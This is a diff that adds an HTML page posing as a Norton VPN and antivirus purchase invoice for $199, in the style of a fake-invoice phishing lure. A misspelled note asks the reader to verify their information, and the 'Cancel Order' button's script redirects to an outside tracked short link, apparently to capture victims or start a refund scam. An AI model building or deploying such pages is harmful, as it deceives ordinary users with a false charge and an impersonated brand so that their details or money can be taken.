@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Purchase Invoice</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to right, #ffecd2, #fcb69f);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+        }
+        .header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+            color: #333;
+        }
+        .product-details {
+            padding: 20px 0;
+        }
+        .product {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        .product div {
+            font-size: 18px;
+            color: #555;
+        }
+        .cancel-order {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .cancel-order button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        .cancel-order button:hover {
+            background: #ff3b3b;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Purchase Invoice</h1>
+        </div>
+        <div class="product-details">
+            <!-- Displaying the product information -->
+            <div class="product">
+                <div>Product:</div>
+                <div>Norton VPN + Antivirus</div>
+            </div>
+            <div class="product">
+                <div>Price:</div>
+                <div>$199</div>
+            </div>
+            
+            <div>
+            
+            	<p><strong>Note:</strong> May you need to verify your information for security perposes or its really you or not.</p>
+            
+            </div>
+        </div>
+        <div class="cancel-order">
+            <button onclick="cancelOrder()">Cancel Order</button>
+        </div>
+    </div>
+
+    <script>
+        function cancelOrder() {
+            // Redirect to the desired URL when the cancel button is clicked
+            window.location.href = "https://smrturl.co/o/379533/53470801?s1=juwelrana";
+        }
+    </script>
+</body>
+</html>
+
